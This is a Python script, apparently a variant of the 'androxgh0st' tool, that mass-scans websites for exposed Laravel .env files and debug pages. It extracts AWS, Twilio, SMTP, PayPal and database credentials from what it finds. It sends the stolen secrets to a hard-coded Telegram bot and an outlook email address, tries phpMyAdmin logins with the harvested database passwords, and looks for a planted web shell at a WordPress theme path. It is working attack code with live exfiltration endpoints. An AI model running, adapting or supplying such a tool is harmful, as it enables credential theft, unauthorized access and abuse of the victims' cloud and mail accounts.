import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from multiprocessing import Pool
from configparser import ConfigParser
from queue import Queue
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if os.system == "nt":
    os.system('cls')
else:
    os.system('clear')
    
if not os.path.exists("result"):
    os.mkdir("result")

if not os.path.exists("cms"):
    os.mkdir("cms")

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''

def send_html(smtp_server, smtp_port, smtp_username, smtp_password):
    message = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    {host}
    {port}
    {username}
    {password}
</body>
</html>"""
    msg = MIMEMultipart()
    msg['From'] = "dika result"
    msg['To'] = "ssxxaa00@outlook.com"
    msg['Subject'] = "This result"
    try:
        # Membuat lampiran pesan email berisi file HTML
        part = MIMEText(message, 'html')
        msg.attach(part)
        socket.setdefaulttimeout(15)
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
    except Exception as e:
        pass

def send_tele(message):
    try:
        bot_token = "6357080171:AAG8McTbMCuCGrN6W-tDrLftORJ-lw6xfEc"  # Gantilah dengan token bot Anda
        chat_id = "5086309153"  # Gantilah dengan chat ID yang sesuai
        message_text = message
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {"chat_id": chat_id, "text": message_text}
        response = requests.get(url, params=params)
    except:
        pass

def paypal(text, url):
    if "PAYPAL_" in text:
        print('\033[32;1m#\033[0m '+url+' | \033[32;PAYPAL\033[0m')
        send_tele(url+'\n')

def get_aws_region( text):
    reg = False
    for region in list_region.splitlines():
        if str(region) in text:
            return region
            break

def get_aws_data(text, url):
    try:
        if "AWS_ACCESS_KEY_ID" in text:
            method = '/.env'
            try:
                aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
            except:
                aws_key = ''
            try:
                aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
            except:
                aws_sec = ''
            try:
                asu = androxgh0st().get_aws_region(text)
                if asu:
                    aws_reg = asu
                else:
                    aws_reg = ''
            except:
                aws_reg = ''
        elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
            method = 'debug'
            try:
                aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            except:
                aws_key = ''
            try:
                aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            except:
                aws_sec = ''
            try:
                asu = androxgh0st().get_aws_region(text)
                if asu:
                    aws_reg = asu
                else:
                    aws_reg = ''
            except:
                aws_reg = ''
            if aws_reg == "":
                aws_reg = "aws_unknown_region--"
            if aws_key == "" and aws_sec == "":
                return False
            else:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                remover = str(build).replace('\r', '')
                print('\033[32;1m#\033[0m '+url+' | \033[32;AWS\033[0m')
                send_tele(remover)
                return True
        elif "AWS_KEY" in text:
            if "AWS_KEY=" in text:
                method = '/.env'
                try:
                    aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
                try:
                    aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                except:
                    aws_buc = ''
            elif "<td>AWS_KEY</td>" in text:
                method = 'debug'
                try:
                    aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
                try:
                    aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_buc = ''
            if aws_reg == "":
                aws_reg = "aws_unknown_region--"
            if aws_key == "" and aws_sec == "":
                return False
            else:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
                remover = str(build).replace('\r', '')
                print('\033[32;1m#\033[0m '+url+' | \033[32;AWS\033[0m')
                send_tele(remover+'\n\n')
            return True
        elif "SES_KEY" in text:
            if "SES_KEY=" in text:
                method = '/.env'
                try:
                    aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
            elif "<td>SES_KEY</td>" in text:
                method = 'debug'
                try:
                    aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_key = ''
                try:
                    aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    aws_sec = ''
                try:
                    asu = androxgh0st().get_aws_region(text)
                    if asu:
                        aws_reg = asu
                    else:
                        aws_reg = ''
                except:
                    aws_reg = ''
            if aws_reg == "":
                aws_reg = "aws_unknown_region--"
            if aws_key == "" and aws_sec == "":
                return False
            else:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
                remover = str(build).replace('\r', '')
                print('\033[32;1m#\033[0m '+url+' | \033[32;AWS\033[0m')
                send_tele(remover+'\n\n')
            return True
        else:
            return False
    except Exception as e:
        pass

def get_twillio(text, url):
    try:
        if "TWILIO" in text:
            if "TWILIO_ACCOUNT_SID=" in text:
                method = '/.env'
                try:
                    acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
                except:
                    acc_sid = ''
                try:
                    acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
                except:
                    acc_key = ''
                try:
                    sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
                except:
                    sec = ''
                try:
                    chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
                except:
                    chatid = ''
                try:
                    phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
                except:
                    phone = ''
                try:
                    auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                except:
                    auhtoken = ''
            elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                method = 'debug'
                try:
                    acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    acc_sid = ''
                try:
                    acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    acc_key = ''
                try:
                    sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    sec = ''
                try:
                    chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    chatid = ''
                try:
                    phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    phone = ''
                try:
                    auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    auhtoken = ''
            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
            remover = str(build).replace('\r', '')
            print('\033[32;1m#\033[0m '+url+' | \033[32;TWILIO\033[0m')
            send_tele(remover+'\n\n')
            return True
        else:
            return False
    except Exception as e:
        pass

def get_smtp(text, url):
    try:
        if "MAIL_HOST" in text:
            if "MAIL_HOST=" in text:
                method = '/.env'
                mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                try:
                    mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                except:
                    mailfrom = ''
                try:
                    fromname = reg("\MAIL_FROM_NAME=(.*?)\n", text)[0]
                except:
                    fromname = ''
            elif "<td>MAIL_HOST</td>" in text:
                method = 'debug'
                mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                try:
                    mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    mailfrom = ''
                try:
                    fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                except:
                    fromname = ''
            if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                return False
            else:
                # mod aws
                if '.amazonaws.com' in mailhost:
                    getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif 'sendgrid' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif 'office365' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif '1and1' in mailhost or '1und1' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif 'zoho' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif 'mandrillapp' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                elif 'mailgun' in mailhost:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    print('\033[32;1m#\033[0m '+url+' | \033[32;SMTP\033[0m')
                    send_html(mailhost,mailport,mailuser,mailpass)
                return True
        else:
            return False
    except Exception as e:
        pass

def loginphp(url,host,port,database,username,password):
    try:
        head = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'http://{url}',
            'Connection': 'keep-alive',
            'Referer': f'http://{url}/phpmyadmin/index.php',
            'Upgrade-Insecure-Requests': '1',
        }
        data = {
            'pma_username': username,
            'pma_password': password,
            'server': '1',
            'lang': 'en-utf-8',
            'convcharset': 'iso-8859-1',
        }
        log = requests.post("https://"+url+"/phpmyadmin/index.php",headers=head ,data=data)
        if log.status_code == 200:
            print('\033[32;1m#\033[0m '+url+' | \033[32;1mAccess_Data_Base\033[0m')
            with open("result/acces_database.txt","a") as mn:
                mn.write(f"\n\n{url}\n{'='*30}\n\nhost: {host}\nport: {port}\ndatabase: {database}\nusername: {username}\npassword: {password}")
    except Exception as e:
        pass

def get_db(text, url):
    try:
        konek = reg("DB_CONNECTION=(.*?)\n", text)[0]
        host = reg("DB_HOST=(.*?)\n", text)[0]
        port = reg("DB_PORT=(.*?)\n", text)[0]
        database = reg("DB_DATABASE=(.*?)\n", text)[0]
        username = reg("DB_USERNAME=(.*?)\n", text)[0]
        password = reg("DB_PASSWORD=(.*?)\n", text)[0]
        print('\033[32;1m#\033[0m '+url+' | \033[32;1mData_Base\033[0m')
        if "localhost" in host or "127.0.0.1" in host:
            loginphp(url, host, port, database, username, password)
        else:
            with open("result/database.txt", "a") as files:
                files.write(f"\n\n{url}\n{'='*30}\nDB_connection: {konek}\nhost: {host}\nport: {port}\ndatabase: {database}\nusername: {username}\npassword: {password}")
    except:
        pass

def main(url):
    try:
        if url.startswith('http://'):
            url = url.replace('http://', '')
        elif url.startswith('https://'):
            url = url.replace('https://', '')
        elif url.startswith('https://'):
            url = url.replace('https://www.','')
        head = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get("https://"+url+"/.env", headers=head, timeout=5, verify=False, allow_redirects=False).text
        get_cek = requests.get("https://"+url+"/wp-content/themes/seotheme/db.php?u", headers=head,timeout=5, verify=False, allow_redirects=False)
        if "APP_KEY=" in get_source or "APP_NAME=" in get_source:
            resp = get_source
        else:
            get_source = requests.post("https://"+url, data={"0x[]":"androxgh0st"}, headers=head, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = get_smtp(resp, url)
            getwtilio = get_twillio(resp, url)
            getaws = get_aws_data(resp, url)
            getpp = paypal(resp, url)
            db = get_db(resp, url)
            with open("result/laravel.txt","a") as fk:
                fk.write(url+"/.env\n")

        if "input name=_upl type=submit" in get_cek.text:
            print('\033[32;1m#\033[0m '+url+' | \033[32;Shell\033[0m')
            with open("result/shell.txt","a") as wr:
                wr.write(url+"/wp-content/themes/seotheme/db.php?u\n")
                send_tele(url+"/wp-content/themes/seotheme/db.php?u\n")

        else:
            print('\033[32;1m#\033[0m '+url+' | \033[31;1mCan\'t get everything\033[0m')
    except Exception as e:
        print('\033[32;1m#\033[0m '+url+' | \033[31;1mCan\'t get everything\033[0m')

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1]:
            path = sys.argv[1]
            th = 45
        else:
            path = input('Masukkan daftar situs web: ')
            th = input('Masukkan jumlah Thread: ')
        with open(path,"r") as fle:
            lista = fle.read().splitlines()        
        pool = Pool(processes=int(th))
        pool.map(main, lista)
        # pool.wait_completion()
    except KeyboardInterrupt:
        sys.exit(0)

